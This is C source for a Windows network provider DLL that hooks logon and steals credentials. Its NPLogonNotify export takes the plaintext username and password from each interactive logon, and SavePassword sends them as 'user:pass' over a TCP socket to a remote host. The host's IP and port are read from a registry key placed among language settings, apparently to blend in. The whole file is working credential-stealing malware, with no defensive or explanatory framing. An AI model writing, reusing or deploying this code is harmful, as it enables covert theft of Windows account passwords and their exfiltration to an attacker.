#include <winsock2.h>
#include <stdio.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define rKey L"SYSTEM\\CurrentControlSet\\Control\\MUI\\Settings\\LanguageConfiguration"

// from npapi.h
#define WNNC_SPEC_VERSION                0x00000001
#define WNNC_SPEC_VERSION51              0x00050001
#define WNNC_NET_TYPE                    0x00000002
#define WNNC_START                       0x0000000C
#define WNNC_WAIT_FOR_START              0x00000001

//from ntdef.h
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// from NTSecAPI.h
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE
{
	MsV1_0InteractiveLogon = 2,
	MsV1_0Lm20Logon,
	MsV1_0NetworkLogon,
	MsV1_0SubAuthLogon,
	MsV1_0WorkstationUnlockLogon = 7,
	MsV1_0S4ULogon = 12,
	MsV1_0VirtualLogon = 82,
	MsV1_0NoElevationLogon = 83,
	MsV1_0LuidLogon = 84,
} MSV1_0_LOGON_SUBMIT_TYPE, * PMSV1_0_LOGON_SUBMIT_TYPE;

// from NTSecAPI.h
typedef struct _MSV1_0_INTERACTIVE_LOGON
{
	MSV1_0_LOGON_SUBMIT_TYPE MessageType;
	UNICODE_STRING LogonDomainName;
	UNICODE_STRING UserName;
	UNICODE_STRING Password;
} MSV1_0_INTERACTIVE_LOGON, * PMSV1_0_INTERACTIVE_LOGON;


DWORD getPtReg()
{
	HKEY hkey;
	DWORD dw;
	DWORD Type;
	DWORD Datasize = 255;
	DWORD port;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		rKey,
		0,
		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
		&hkey) == ERROR_SUCCESS)

	{
		DWORD error = RegQueryValueEx(hkey,
			L"pt",
			NULL,
			&Type,
			(LPBYTE)&port,
			&Datasize);

		if (error == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
			return port;
		}
	}
	RegCloseKey(hkey);
	return 80;
}

char* getIPReg()
{
	HKEY hKey;
	char Data[255];
	DWORD Datasize = sizeof(Data);
	DWORD Type;
	char ipa[20];
	int indCtr = 0;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		rKey,
		0,
		KEY_QUERY_VALUE | KEY_WOW64_32KEY,
		&hKey) == ERROR_SUCCESS)
	{
		DWORD error = RegQueryValueEx(hKey,
			L"ipa",
			NULL,
			&Type,
			(LPBYTE)&Data,
			&Datasize);

		if (error == ERROR_SUCCESS)
		{
			for (int i = 0; i < sizeof(Data); i += 2)
			{
				if (Data[i] == '\0')
				{
					ipa[indCtr] = '\0';
					break;
				}
				else
				{
					ipa[indCtr] = Data[i];
					indCtr++;
				}
			}
			RegCloseKey(hKey);
			return ipa;
		}
	}
	RegCloseKey(hKey);
	return "8.8.8.8";
}


int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char* ip = getIPReg();
	DWORD port = getPtReg();
	printf("%s:%d", ip, port);

	char user[50];
	char pass[50];
	char creds[100];

	wcstombs(user, username->Buffer, sizeof(user));
	wcstombs(pass, password->Buffer, sizeof(pass));

	sprintf(creds, "%s:%s;end", user, pass);

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");

	//Create a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	printf("Socket created.\n");

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	//Connect to remote server
	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		WSACleanup();
		return 1;
	}

	puts("Connected");

	//Send some data
	if (send(s, creds, strlen(creds), 0) < 0)
	{
		puts("Send failed");
		WSACleanup();
		return 1;
	}
	puts("Data Send\n");

	WSACleanup();

	return 0;
}


__declspec(dllexport)
DWORD
APIENTRY
NPGetCaps(
	DWORD nIndex
)
{
	switch (nIndex)
	{
	case WNNC_SPEC_VERSION:
		return WNNC_SPEC_VERSION51;

	case WNNC_NET_TYPE:
		return WNNC_CRED_MANAGER;

	case WNNC_START:
		return WNNC_WAIT_FOR_START;

	default:
		return 0;
	}
}


__declspec(dllexport)
DWORD
APIENTRY
NPLogonNotify(
	PLUID lpLogonId,
	LPCWSTR lpAuthInfoType,
	LPVOID lpAuthInfo,
	LPCWSTR lpPrevAuthInfoType,
	LPVOID lpPrevAuthInfo,
	LPWSTR lpStationName,
	LPVOID StationHandle,
	LPWSTR* lpLogonScript
)
{
	SavePassword(
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->UserName),
		&(((MSV1_0_INTERACTIVE_LOGON*)lpAuthInfo)->Password)
	);
	lpLogonScript = NULL;
	return WN_SUCCESS;
}
